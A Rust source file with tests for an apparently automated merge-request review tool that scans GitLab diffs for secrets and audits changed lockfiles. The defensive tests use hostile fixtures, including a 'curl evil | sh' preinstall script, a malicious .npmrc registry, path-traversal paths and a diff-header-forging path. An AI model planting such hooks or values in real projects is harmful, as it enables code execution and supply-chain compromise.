//! The model-free gates LoopX's own fixes pass before their merge request
//! opens, run on a human-authored MR by the MR Review loop: the secret scan of
//! the API diff and the dependency audit of changed lockfiles. Advisory only.

use crate::connectors::http::quote;
use crate::connectors::{ApiOpts, Connector, ConnectorError};
use crate::loop_result::VerificationResult;
use crate::loops_config::{py_str, py_truthy};
use crate::security_scan::scan_result;
use serde_json::{json, Map, Value};
use std::path::{Path, PathBuf};
use std::time::Instant;

fn text(change: &Value, key: &str) -> String {
    change
        .get(key)
        .filter(|v| py_truthy(v))
        .map(py_str)
        .unwrap_or_default()
}

fn flag(change: &Value, key: &str) -> bool {
    change.get(key).and_then(Value::as_bool) == Some(true)
}

/// The API `changes` as a `git diff`: each file opens with `diff --git`, which
/// is where `security_scan::scan` starts attributing hits to a new path.
pub fn unified_diff(changes: &[Value]) -> String {
    let mut out = String::new();
    for c in changes.iter().filter(|c| !control_path(c)) {
        let diff = text(c, "diff");
        if diff.is_empty() {
            continue;
        }
        let (old, new) = (text(c, "old_path"), text(c, "new_path"));
        let old = if old.is_empty() { new.clone() } else { old };
        let new = if new.is_empty() { old.clone() } else { new };
        out.push_str(&format!(
            "diff --git a/{old} b/{new}\n--- a/{old}\n+++ b/{new}\n{diff}\n"
        ));
    }
    out
}

/// A path that would forge diff headers in [`unified_diff`].
fn control_path(change: &Value) -> bool {
    ["old_path", "new_path"]
        .iter()
        .any(|k| text(change, k).chars().any(char::is_control))
}

pub fn added_paths(changes: &[Value]) -> Vec<String> {
    changes
        .iter()
        .filter(|c| flag(c, "new_file"))
        .map(|c| text(c, "new_path"))
        .filter(|p| !p.is_empty())
        .collect()
}

/// Changes with no text diff to scan: binaries, and files GitLab collapsed or
/// found too large. A pure rename adds no line, so it is not one of them.
pub fn unscanned(changes: &[Value]) -> usize {
    changes
        .iter()
        .filter(|c| {
            let pure_rename =
                flag(c, "renamed_file") && !flag(c, "too_large") && !flag(c, "collapsed");
            control_path(c)
                || (text(c, "diff").is_empty() && !flag(c, "deleted_file") && !pure_rename)
        })
        .count()
}

pub fn secret_scan(changes: &[Value], truncated: bool) -> VerificationResult {
    let start = Instant::now();
    let hits = crate::security_scan::scan(&unified_diff(changes), &added_paths(changes));
    let mut r = scan_result("security_scan", &hits, start);
    r.evidence["unscanned"] = json!(unscanned(changes));
    r.evidence["truncated"] = json!(truncated);
    r
}

pub fn gate_meta(r: &VerificationResult) -> Value {
    json!({"passed": r.passed, "output": r.output, "evidence": r.evidence})
}

pub const MAX_LOCKFILES_PER_MR: usize = 3;
pub const MAX_LOCKFILE_BYTES: usize = 10 * 1024 * 1024;
const FILES_API_TIMEOUT_SECS: u64 = 60;
const REFUSED_PATH: &str = "refusing lockfile path";

/// A repo-relative path that stays inside the scratch dir and cannot be read
/// as a command-line option.
pub fn safe_rel_path(p: &str) -> bool {
    !p.is_empty()
        && !p.starts_with('/')
        && !p.chars().any(|c| c.is_control() || c == '\\')
        && p.split('/')
            .all(|c| !c.is_empty() && c != "." && c != ".." && !c.starts_with('-'))
}

pub struct LockfileTree {
    pub dir: tempfile::TempDir,
    pub head: PathBuf,
    pub diff: String,
    pub notes: Vec<String>,
}

fn os_err(e: std::io::Error) -> ConnectorError {
    ConnectorError::Other {
        class: "OSError".into(),
        detail: e.to_string(),
    }
}

/// `Ok(None)` when the file does not exist at `sha`; `Err(())` when it is
/// over [`MAX_LOCKFILE_BYTES`].
fn fetch_file(
    conn: &dyn Connector,
    project_id: &str,
    path: &str,
    sha: &str,
) -> Result<Result<Option<Vec<u8>>, ()>, ConnectorError> {
    use base64::Engine;
    let url = format!(
        "/projects/{}/repository/files/{}?ref={}",
        quote(project_id),
        quote(path),
        quote(sha)
    );
    let file = match conn.api(
        "GET",
        &url,
        &ApiOpts::default().timeout(FILES_API_TIMEOUT_SECS),
    ) {
        Ok(f) => f,
        Err(e) if e.status() == Some(404) => return Ok(Ok(None)),
        Err(e) => return Err(e),
    };
    let size = file.get("size").and_then(Value::as_u64).unwrap_or(0);
    if size > MAX_LOCKFILE_BYTES as u64 {
        return Ok(Err(()));
    }
    let content: String = file
        .get("content")
        .and_then(Value::as_str)
        .unwrap_or("")
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(content)
        .map_err(|e| ConnectorError::Other {
            class: "ValueError".into(),
            detail: e.to_string(),
        })?;
    if bytes.len() > MAX_LOCKFILE_BYTES {
        return Ok(Err(()));
    }
    Ok(Ok(Some(bytes)))
}

fn write_file(root: &Path, rel: &str, bytes: &[u8]) -> Result<(), ConnectorError> {
    let path = root.join(rel);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(os_err)?;
    }
    std::fs::write(path, bytes).map_err(os_err)
}

/// The manifest an audit tool needs beside the lockfile; never a tool config.
fn sidecar(lockfile: &str) -> Option<String> {
    use crate::dependency_audit::Ecosystem;
    match crate::dependency_audit::ecosystem_of(lockfile)? {
        Ecosystem::Npm | Ecosystem::Yarn | Ecosystem::Pnpm => {
            Some(match lockfile.rsplit_once('/') {
                Some((dir, _)) => format!("{dir}/package.json"),
                None => "package.json".to_string(),
            })
        }
        _ => None,
    }
}

use crate::dependency_audit::PACKAGE_JSON_AUDIT_KEYS;

/// The `package.json` keys a lockfile-only audit reads; ignore lists,
/// overrides, scripts and `packageManager` (a Corepack download) never reach it.
const MANIFEST_KEYS: [&str; 8] = [
    "name",
    "version",
    "private",
    "workspaces",
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
];

fn reduced_manifest(manifest: &Value) -> Option<Value> {
    let obj = manifest.as_object()?;
    Some(Value::Object(
        MANIFEST_KEYS
            .iter()
            .filter_map(|k| Some((k.to_string(), obj.get(*k)?.clone())))
            .collect(),
    ))
}

fn has_audit_key(v: &Value) -> bool {
    match v {
        Value::Object(o) => o
            .iter()
            .any(|(k, v)| PACKAGE_JSON_AUDIT_KEYS.contains(&k.as_str()) || has_audit_key(v)),
        Value::Array(a) => a.iter().any(has_audit_key),
        _ => false,
    }
}

fn lockfile_diff(dir: &Path, p: &str) -> Result<String, ConnectorError> {
    let out = std::process::Command::new("git")
        .args([
            "-c",
            "core.quotePath=false",
            "diff",
            "--no-index",
            "--no-color",
            "--no-ext-diff",
            "--no-textconv",
            "-U5",
            "--",
            &format!("base/{p}"),
            &format!("head/{p}"),
        ])
        .current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("HOME", dir)
        .env("XDG_CONFIG_HOME", dir)
        .output()
        .map_err(os_err)?;
    match out.status.code() {
        Some(0) => return Ok(String::new()),
        Some(1) => {}
        _ => {
            return Err(ConnectorError::Other {
                class: "GitDiffError".into(),
                detail: String::from_utf8_lossy(&out.stderr).into_owned(),
            })
        }
    }
    let mut in_hunk = false;
    let mut lines = Vec::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        in_hunk |= line.starts_with("@@");
        lines.push(if in_hunk {
            line.to_string()
        } else if line.starts_with("diff --git ") {
            format!("diff --git a/{p} b/{p}")
        } else if line.starts_with("--- ") {
            format!("--- a/{p}")
        } else if line.starts_with("+++ ") {
            format!("+++ b/{p}")
        } else {
            line.to_string()
        });
    }
    Ok(lines.join("\n") + "\n")
}

/// The agent gate's own `dependency_audit::audit` on the head tree. The tree
/// holds no tool config from the MR, so its tools read only LoopX's defaults.
pub fn audit_lockfiles(
    tree: &LockfileTree,
    runner: &dyn crate::dependency_audit::AuditRunner,
) -> VerificationResult {
    let mut r = crate::dependency_audit::audit(
        "dependency_audit",
        &tree.head,
        &tree.diff,
        runner,
        Instant::now(),
    );
    if !tree.notes.is_empty() {
        r.output = std::iter::once(r.output.as_str())
            .filter(|o| !o.is_empty())
            .chain(tree.notes.iter().map(String::as_str))
            .collect::<Vec<_>>()
            .join("\n");
        r.evidence["notes"] = json!(tree.notes);
    }
    r
}

fn note(notes: &mut Vec<String>, n: String) {
    if !notes.contains(&n) {
        notes.push(n);
    }
}

pub fn lockfile_tree(
    conn: &dyn Connector,
    project_id: &str,
    base_sha: &str,
    head_sha: &str,
    changed_paths: &[String],
    old_paths: &Map<String, Value>,
) -> Result<Option<LockfileTree>, ConnectorError> {
    let mut lockfiles: Vec<&String> = changed_paths
        .iter()
        .filter(|p| crate::dependency_audit::ecosystem_of(p).is_some())
        .collect();
    if lockfiles.is_empty() {
        return Ok(None);
    }
    lockfiles.sort();
    lockfiles.dedup();
    let mut notes = Vec::new();
    let safe: Vec<(&str, String)> = lockfiles
        .into_iter()
        .filter_map(|p| {
            let base = old_paths.get(p.as_str()).map_or_else(|| p.clone(), py_str);
            if safe_rel_path(p) && safe_rel_path(&base) {
                Some((p.as_str(), base))
            } else {
                note(&mut notes, REFUSED_PATH.into());
                None
            }
        })
        .collect();
    if safe.len() > MAX_LOCKFILES_PER_MR {
        note(
            &mut notes,
            format!(
                "dependency audit: {} more lockfile(s) not audited",
                safe.len() - MAX_LOCKFILES_PER_MR
            ),
        );
    }
    let dir = tempfile::Builder::new()
        .prefix("loopx-mr-gates-")
        .tempdir_in(std::env::temp_dir())
        .map_err(os_err)?;
    let (base_root, head_root) = (dir.path().join("base"), dir.path().join("head"));
    std::fs::create_dir_all(&base_root).map_err(os_err)?;
    std::fs::create_dir_all(&head_root).map_err(os_err)?;
    let mut diff = String::new();
    for (p, base_path) in safe.into_iter().take(MAX_LOCKFILES_PER_MR) {
        let too_big = || {
            format!(
                "{} is over 10 MB - not audited",
                crate::pre_review::one_line(p)
            )
        };
        let (Ok(base), Ok(head)) = (
            fetch_file(conn, project_id, &base_path, base_sha)?,
            fetch_file(conn, project_id, p, head_sha)?,
        ) else {
            note(&mut notes, too_big());
            continue;
        };
        write_file(&base_root, p, &base.unwrap_or_default())?;
        write_file(&head_root, p, &head.unwrap_or_default())?;
        if let Some(manifest) = sidecar(p) {
            if let Ok(Some(bytes)) = fetch_file(conn, project_id, &manifest, head_sha)? {
                let parsed: Option<Value> = serde_json::from_slice(&bytes).ok();
                if parsed.as_ref().map_or_else(
                    || {
                        let text = String::from_utf8_lossy(&bytes);
                        PACKAGE_JSON_AUDIT_KEYS.iter().any(|k| text.contains(k))
                    },
                    has_audit_key,
                ) {
                    note(
                        &mut notes,
                        format!(
                            "the merge request changed audit configuration: {}",
                            crate::pre_review::one_line(&manifest)
                        ),
                    );
                }
                if let Some(reduced) = parsed.as_ref().and_then(reduced_manifest) {
                    write_file(&head_root, &manifest, reduced.to_string().as_bytes())?;
                }
            }
        }
        diff.push_str(&lockfile_diff(dir.path(), p)?);
    }
    Ok(Some(LockfileTree {
        dir,
        head: head_root,
        diff,
        notes,
    }))
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::security_scan::scan;
    use serde_json::json;
    use std::fs;
    use std::path::Path;
    use std::process::Command;

    fn aws_key() -> String {
        format!("AKIA{}", "Z".repeat(16))
    }

    fn change(path: &str, diff: &str) -> Value {
        json!({"old_path": path, "new_path": path, "diff": diff,
               "new_file": false, "deleted_file": false})
    }

    fn added(path: &str, lines: &[&str]) -> Value {
        let mut diff = format!("@@ -0,0 +1,{} @@\n", lines.len());
        for l in lines {
            diff.push_str(&format!("+{l}\n"));
        }
        json!({"old_path": path, "new_path": path, "diff": diff,
               "new_file": true, "deleted_file": false})
    }

    fn rules(r: &VerificationResult) -> Vec<(String, String, Option<i64>)> {
        let mut out: Vec<_> = r.evidence["blocking"]
            .as_array()
            .unwrap()
            .iter()
            .map(|h| {
                (
                    h["rule"].as_str().unwrap().to_string(),
                    h["path"].as_str().unwrap().to_string(),
                    h["line"].as_i64(),
                )
            })
            .collect();
        out.sort();
        out
    }

    #[test]
    fn scan_of_api_changes_attributes_hits_per_file() {
        let changes = vec![
            change("app/one.rb", "@@ -1,2 +1,3 @@\n a\n+b = 1\n c\n"),
            change(
                "config/two.rb",
                &format!("@@ -10,2 +10,3 @@\n x\n+KEY = \"{}\"\n y\n", aws_key()),
            ),
        ];
        let r = secret_scan(&changes, false);
        assert!(!r.passed);
        let blocking = r.evidence["blocking"].as_array().unwrap();
        assert_eq!(blocking.len(), 1, "{blocking:?}");
        assert_eq!(blocking[0]["rule"], "aws_access_key");
        assert_eq!(blocking[0]["path"], "config/two.rb");
        assert_eq!(blocking[0]["line"], 11);
        let diff = unified_diff(&changes);
        assert!(diff.contains("diff --git a/config/two.rb b/config/two.rb\n--- a/config/two.rb\n+++ b/config/two.rb\n"));
    }

    #[test]
    fn payload_diff_is_not_scan_compatible_characterisation() {
        let changes = vec![
            change("app/one.rb", "@@ -1,2 +1,3 @@\n a\n+b = 1\n c\n"),
            change(
                "config/two.rb",
                &format!("@@ -10,2 +10,3 @@\n x\n+KEY = \"{}\"\n y\n", aws_key()),
            ),
        ];
        let (payload_diff, _) = crate::loop_plugins::mr_review::build_diff_text(&changes, 150_000);
        let hits = scan(&payload_diff, &[]);
        assert!(hits.iter().any(|h| h.rule == "aws_access_key"));
        assert!(
            hits.iter().all(|h| h.path == "app/one.rb"),
            "build_diff_text has no `diff --git` separator, so every hit is blamed on the first file: {hits:?}"
        );
    }

    #[test]
    fn new_env_file_is_a_sensitive_file_hit() {
        let r = secret_scan(&[added(".env", &["A=1"])], false);
        assert_eq!(
            rules(&r),
            [("sensitive_file".to_string(), ".env".to_string(), None)]
        );
        assert_eq!(added_paths(&[added(".env", &["A=1"])]), [".env"]);
    }

    #[test]
    fn binary_and_collapsed_changes_are_counted_unscanned() {
        let changes = vec![
            change("img/logo.png", ""),
            json!({"old_path": "big.sql", "new_path": "big.sql", "diff": "", "too_large": true}),
            json!({"old_path": "gone.rb", "new_path": "gone.rb", "diff": "", "deleted_file": true}),
            json!({"old_path": "old.rb", "new_path": "new.rb", "diff": "", "renamed_file": true}),
            json!({"old_path": "o.sql", "new_path": "n.sql", "diff": "", "renamed_file": true, "collapsed": true}),
            change("app/a.rb", "@@ -1 +1 @@\n-a\n+b\n"),
        ];
        assert_eq!(unscanned(&changes), 3);
        let r = secret_scan(&changes, true);
        assert_eq!(r.evidence["unscanned"], 3);
        assert_eq!(r.evidence["truncated"], true);
        assert!(!unified_diff(&changes).contains("logo.png"));
    }

    #[test]
    fn a_path_with_a_control_character_is_not_scanned_but_counted() {
        let evil = "app/x.rb\n+++ b/spec/evil_spec.rb";
        let changes = vec![
            change(evil, "@@ -0,0 +1 @@\n+password = \"hunter2hunter2\"\n"),
            change("config/real.rb", "@@ -1 +1,2 @@\n a\n+ok = 1\n"),
        ];
        let diff = unified_diff(&changes);
        assert!(!diff.contains("evil_spec"), "{diff}");
        assert!(diff.starts_with("diff --git a/config/real.rb b/config/real.rb\n"));
        assert_eq!(unscanned(&changes), 1);
        assert_eq!(secret_scan(&changes, false).evidence["unscanned"], 1);
    }

    fn git(dir: &Path, args: &[&str]) {
        let s = Command::new("git")
            .args([
                "-c",
                "user.email=t@t",
                "-c",
                "user.name=t",
                "-c",
                "commit.gpgsign=false",
            ])
            .args(args)
            .current_dir(dir)
            .output()
            .unwrap();
        assert!(
            s.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&s.stderr)
        );
    }

    #[test]
    fn human_and_agent_paths_flag_the_same_rules() {
        let key_line = format!("KEY = \"{}\"", aws_key());
        let files: [(&str, Vec<&str>); 3] = [
            (".env", vec!["A=1"]),
            ("config/app.rb", vec!["x = 1", &key_line]),
            ("spec/x_spec.rb", vec!["password: \"password123\""]),
        ];
        let repo = tempfile::tempdir().unwrap();
        git(repo.path(), &["init", "-q", "-b", "main"]);
        fs::write(repo.path().join("README"), "x\n").unwrap();
        git(repo.path(), &["add", "."]);
        git(repo.path(), &["commit", "-qm", "init"]);
        git(repo.path(), &["checkout", "-qb", "feature"]);
        for (path, lines) in &files {
            let p = repo.path().join(path);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, format!("{}\n", lines.join("\n"))).unwrap();
        }
        git(repo.path(), &["add", "."]);
        git(repo.path(), &["commit", "-qm", "c"]);
        let (diff, added_files) =
            crate::loop_verifiers::branch_changes(repo.path(), "main").unwrap();
        let agent = scan_result("security_scan", &scan(&diff, &added_files), Instant::now());
        let changes: Vec<Value> = files.iter().map(|(p, l)| added(p, l)).collect();
        let human = secret_scan(&changes, false);
        assert_eq!(rules(&human), rules(&agent));
        assert!(rules(&human).iter().any(|r| r.0 == "sensitive_file"));
        assert!(rules(&human).iter().any(|r| r.0 == "aws_access_key"));
        assert!(!rules(&human).iter().any(|r| r.1.starts_with("spec/")));
    }

    #[test]
    fn matched_secret_never_in_gate_meta() {
        let key = aws_key();
        let r = secret_scan(
            &[change(
                "config/app.rb",
                &format!("@@ -1 +1,2 @@\n a\n+KEY = \"{key}\"\n"),
            )],
            false,
        );
        let meta = gate_meta(&r);
        assert_eq!(meta["passed"], false);
        assert_eq!(meta["evidence"]["blocking"][0]["rule"], "aws_access_key");
        assert!(!meta.to_string().contains(&key));
    }

    // ---- lockfile tree ------------------------------------------------------

    use crate::connectors::http::HttpError;
    use crate::connectors::{gitlab, Account, ApiOpts, Connector, ConnectorError, TypeInfo};
    use base64::Engine;
    use std::collections::BTreeMap;
    use std::sync::Mutex;

    /// `(path, ref)` -> file content; anything else is a 404.
    pub(crate) struct Files {
        account: Account,
        pub(crate) files: BTreeMap<(String, String), String>,
        pub(crate) sizes: BTreeMap<String, u64>,
        pub(crate) fail: Option<u16>,
        pub(crate) calls: Mutex<Vec<String>>,
    }

    impl Files {
        pub(crate) fn new(files: &[(&str, &str, &str)]) -> Self {
            Self {
                account: Account::new("work", "gitlab"),
                files: files
                    .iter()
                    .map(|(p, r, c)| ((p.to_string(), r.to_string()), c.to_string()))
                    .collect(),
                sizes: BTreeMap::new(),
                fail: None,
                calls: Mutex::new(vec![]),
            }
        }
        fn requested(&self) -> Vec<String> {
            self.calls.lock().unwrap().clone()
        }
    }

    impl Connector for Files {
        fn info(&self) -> &'static TypeInfo {
            &gitlab::INFO
        }
        fn account(&self) -> &Account {
            &self.account
        }
        fn api(&self, method: &str, path: &str, opts: &ApiOpts) -> Result<Value, ConnectorError> {
            assert_eq!(method, "GET");
            assert_eq!(opts.timeout_secs, 60);
            self.calls.lock().unwrap().push(path.to_string());
            if let Some(status) = self.fail {
                return Err(ConnectorError::Http(HttpError::new(Some(status), "x", "u")));
            }
            let rest = path
                .strip_prefix("/projects/9/repository/files/")
                .expect("files API");
            let (file, sha) = rest.split_once("?ref=").unwrap();
            let file = file.replace("%2F", "/");
            match self.files.get(&(file.clone(), sha.to_string())) {
                Some(c) => Ok(json!({
                    "file_path": file,
                    "size": self.sizes.get(&file).copied().unwrap_or(c.len() as u64),
                    "encoding": "base64",
                    "content": base64::engine::general_purpose::STANDARD.encode(c)})),
                None => Err(ConnectorError::Http(HttpError::new(Some(404), "x", "u"))),
            }
        }
    }

    pub(crate) fn npm_lock(lodash: &str) -> String {
        format!(
            "{{\n  \"name\": \"web\",\n  \"lockfileVersion\": 3,\n  \"packages\": {{\n    \"\": {{\n      \"name\": \"web\"\n    }},\n    \"node_modules/left-pad\": {{\n      \"version\": \"1.3.0\"\n    }},\n    \"node_modules/lodash\": {{\n      \"version\": \"{lodash}\",\n      \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-{lodash}.tgz\"\n    }}\n  }}\n}}\n"
        )
    }

    fn tree(conn: &Files, changed: &[&str], old: Value) -> Option<LockfileTree> {
        let changed: Vec<String> = changed.iter().map(|s| s.to_string()).collect();
        lockfile_tree(
            conn,
            "9",
            "base",
            "head",
            &changed,
            old.as_object().unwrap(),
        )
        .unwrap()
    }

    fn files_under(dir: &Path) -> Vec<String> {
        let mut out = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(d) = stack.pop() {
            for e in fs::read_dir(&d).unwrap() {
                let p = e.unwrap().path();
                if p.is_dir() {
                    stack.push(p);
                } else {
                    out.push(p.strip_prefix(dir).unwrap().display().to_string());
                }
            }
        }
        out.sort();
        out
    }

    #[test]
    fn no_lockfile_changed_is_none() {
        let conn = Files::new(&[]);
        assert!(tree(&conn, &["app/a.rb", "package.json"], json!({})).is_none());
        assert!(conn.requested().is_empty());
    }

    #[test]
    fn lockfile_diff_has_git_headers_and_only_real_changes() {
        let (old, new) = (npm_lock("4.17.20"), npm_lock("4.17.21"));
        let conn = Files::new(&[
            ("web/package-lock.json", "base", &old),
            ("web/package-lock.json", "head", &new),
            ("web/package.json", "head", "{\"name\": \"web\"}\n"),
        ]);
        let t = tree(&conn, &["web/package-lock.json"], json!({})).unwrap();
        assert!(
            t.diff
                .starts_with("diff --git a/web/package-lock.json b/web/package-lock.json\n"),
            "{}",
            t.diff
        );
        assert!(t
            .diff
            .contains("\n--- a/web/package-lock.json\n+++ b/web/package-lock.json\n"));
        assert!(
            t.diff.contains("+      \"version\": \"4.17.21\","),
            "{}",
            t.diff
        );
        let changed: Vec<&str> = t
            .diff
            .lines()
            .filter(|l| {
                (l.starts_with('+') || l.starts_with('-'))
                    && !l.starts_with("+++")
                    && !l.starts_with("---")
            })
            .collect();
        assert_eq!(changed.len(), 4, "{changed:?}");
        assert!(changed.iter().all(|l| l.contains("4.17.2")), "{changed:?}");
        assert!(!t.diff.contains("base/") && !t.diff.contains("head/"));
        assert_eq!(t.head, t.dir.path().join("head"));
        assert_eq!(
            fs::read_to_string(t.head.join("web/package-lock.json")).unwrap(),
            new
        );
        assert!(t.notes.is_empty(), "{:?}", t.notes);
        let touched = crate::dependency_audit::touched_packages("web/package-lock.json", &t.diff);
        assert_eq!(touched.into_iter().collect::<Vec<_>>(), ["lodash"]);
    }

    #[test]
    fn added_lockfile_has_empty_base() {
        let conn = Files::new(&[(
            "Cargo.lock",
            "head",
            "[[package]]\nname = \"a\"\nversion = \"1.0.0\"\n",
        )]);
        let t = tree(&conn, &["Cargo.lock"], json!({})).unwrap();
        assert_eq!(
            fs::read_to_string(t.dir.path().join("base/Cargo.lock")).unwrap(),
            ""
        );
        assert!(t.diff.contains("+++ b/Cargo.lock\n"));
        assert!(t.diff.contains("+version = \"1.0.0\""));
        assert!(!t
            .diff
            .lines()
            .any(|l| l.starts_with('-') && !l.starts_with("---")));
    }

    #[test]
    fn renamed_lockfile_reads_its_base_from_the_old_path() {
        let conn = Files::new(&[
            (
                "old/Cargo.lock",
                "base",
                "[[package]]\nname = \"a\"\nversion = \"1.0.0\"\n",
            ),
            (
                "new/Cargo.lock",
                "head",
                "[[package]]\nname = \"a\"\nversion = \"1.0.1\"\n",
            ),
        ]);
        let t = tree(
            &conn,
            &["new/Cargo.lock"],
            json!({"new/Cargo.lock": "old/Cargo.lock"}),
        )
        .unwrap();
        assert!(
            t.diff
                .contains("-version = \"1.0.0\"\n+version = \"1.0.1\""),
            "{}",
            t.diff
        );
    }

    #[test]
    fn lockfile_path_cannot_escape_the_scratch_dir() {
        assert!(safe_rel_path("web/package-lock.json"));
        for bad in [
            "../../evil/Cargo.lock",
            "/abs/Cargo.lock",
            "-x/Cargo.lock",
            "a//Cargo.lock",
            "a/./Cargo.lock",
            "a\n/Cargo.lock",
            "",
        ] {
            assert!(!safe_rel_path(bad), "{bad:?}");
        }
        let conn = Files::new(&[("Cargo.lock", "head", "x\n")]);
        let t = tree(
            &conn,
            &[
                "../../evil/Cargo.lock",
                "/abs/Cargo.lock",
                "-x/Cargo.lock",
                "Cargo.lock",
            ],
            json!({"Cargo.lock": "../up/Cargo.lock"}),
        )
        .unwrap();
        assert!(
            t.notes
                .iter()
                .filter(|n| n.as_str() == "refusing lockfile path")
                .count()
                >= 1
        );
        assert!(
            t.notes
                .iter()
                .all(|n| !n.contains("evil") && !n.contains("..")),
            "{:?}",
            t.notes
        );
        assert!(conn.requested().is_empty(), "{:?}", conn.requested());
        assert!(files_under(t.dir.path()).is_empty());
        assert!(!t.dir.path().join("../evil").exists());
    }

    #[test]
    fn only_allow_listed_sidecars_are_fetched() {
        let conn = Files::new(&[
            ("web/package-lock.json", "base", &npm_lock("1.0.0")),
            ("web/package-lock.json", "head", &npm_lock("1.0.1")),
            ("web/package.json", "head", "{}\n"),
            ("web/.npmrc", "head", "registry=https://evil\n"),
            ("web/.yarnrc.yml", "head", "x: 1\n"),
        ]);
        let t = tree(&conn, &["web/package-lock.json", "web/.npmrc"], json!({})).unwrap();
        let asked = conn.requested();
        assert!(
            asked
                .iter()
                .all(|p| !p.contains("npmrc") && !p.contains("yarnrc")),
            "{asked:?}"
        );
        assert_eq!(
            files_under(&t.head),
            ["web/package-lock.json", "web/package.json"]
        );
        assert_eq!(
            files_under(&t.dir.path().join("base")),
            ["web/package-lock.json"]
        );
    }

    #[test]
    fn audit_ignore_keys_in_package_json_never_reach_the_tree() {
        let manifest = json!({
            "name": "web", "version": "1.0.0", "private": true, "workspaces": ["pkgs/*"],
            "dependencies": {"lodash": "^4.17.20"}, "devDependencies": {"jest": "^29"},
            "optionalDependencies": {"fsevents": "*"}, "peerDependencies": {"react": "*"},
            "scripts": {"preinstall": "curl evil | sh"}, "packageManager": "pnpm@9.0.0",
            "overrides": {"lodash": "4.17.20"}, "resolutions": {"lodash": "4.17.20"},
            "auditConfig": {"ignoreCves": ["CVE-1"]},
            "pnpm": {"auditConfig": {"ignoreGhsas": ["GHSA-35jh-r3h4-6jhm"]}, "overrides": {}}
        })
        .to_string();
        let conn = Files::new(&[
            ("web/pnpm-lock.yaml", "base", "lockfileVersion: '9.0'\n"),
            (
                "web/pnpm-lock.yaml",
                "head",
                "lockfileVersion: '9.0'\npackages: {}\n",
            ),
            ("web/package.json", "head", &manifest),
        ]);
        let t = tree(&conn, &["web/pnpm-lock.yaml"], json!({})).unwrap();
        let written: Value =
            serde_json::from_str(&fs::read_to_string(t.head.join("web/package.json")).unwrap())
                .unwrap();
        assert_eq!(
            written,
            json!({"name": "web", "version": "1.0.0", "private": true, "workspaces": ["pkgs/*"],
                   "dependencies": {"lodash": "^4.17.20"}, "devDependencies": {"jest": "^29"},
                   "optionalDependencies": {"fsevents": "*"}, "peerDependencies": {"react": "*"}})
        );
        let text = written.to_string();
        for key in [
            "auditConfig",
            "ignoreCves",
            "ignoreGhsas",
            "pnpm",
            "overrides",
            "scripts",
        ] {
            assert!(!text.contains(key), "{key}");
        }
        assert_eq!(
            t.notes,
            ["the merge request changed audit configuration: web/package.json"]
        );
    }

    #[test]
    fn a_plain_package_json_adds_no_note() {
        let conn = Files::new(&[
            ("package-lock.json", "base", &npm_lock("1.0.0")),
            ("package-lock.json", "head", &npm_lock("1.0.1")),
            (
                "package.json",
                "head",
                "{\"name\": \"web\", \"dependencies\": {\"lodash\": \"*\"}}",
            ),
        ]);
        let t = tree(&conn, &["package-lock.json"], json!({})).unwrap();
        assert!(t.notes.is_empty(), "{:?}", t.notes);
        assert!(t.head.join("package.json").is_file());
    }

    #[test]
    fn oversized_lockfile_is_skipped_with_a_note() {
        let mut conn = Files::new(&[("Cargo.lock", "base", "a\n"), ("Cargo.lock", "head", "b\n")]);
        conn.sizes
            .insert("Cargo.lock".into(), MAX_LOCKFILE_BYTES as u64 + 1);
        let t = tree(&conn, &["Cargo.lock"], json!({})).unwrap();
        assert_eq!(t.notes, ["Cargo.lock is over 10 MB - not audited"]);
        assert!(t.diff.is_empty());
    }

    #[test]
    fn fourth_lockfile_is_noted_not_fetched() {
        let conn = Files::new(&[]);
        let t = tree(
            &conn,
            &[
                "d/Cargo.lock",
                "a/Cargo.lock",
                "c/Cargo.lock",
                "b/Cargo.lock",
            ],
            json!({}),
        )
        .unwrap();
        assert!(t
            .notes
            .contains(&"dependency audit: 1 more lockfile(s) not audited".to_string()));
        assert!(!conn
            .requested()
            .iter()
            .any(|p| p.contains("d%2FCargo.lock")));
        assert!(conn
            .requested()
            .iter()
            .any(|p| p.contains("c%2FCargo.lock")));
    }

    #[test]
    fn files_api_404_is_absent_other_errors_propagate() {
        let mut conn = Files::new(&[]);
        let t = tree(&conn, &["Cargo.lock"], json!({})).unwrap();
        assert!(t.diff.is_empty(), "both sides absent: no change");
        conn.fail = Some(500);
        let err = lockfile_tree(
            &conn,
            "9",
            "base",
            "head",
            &["Cargo.lock".into()],
            &Map::new(),
        )
        .err()
        .unwrap();
        assert_eq!(err.status(), Some(500));
    }
}
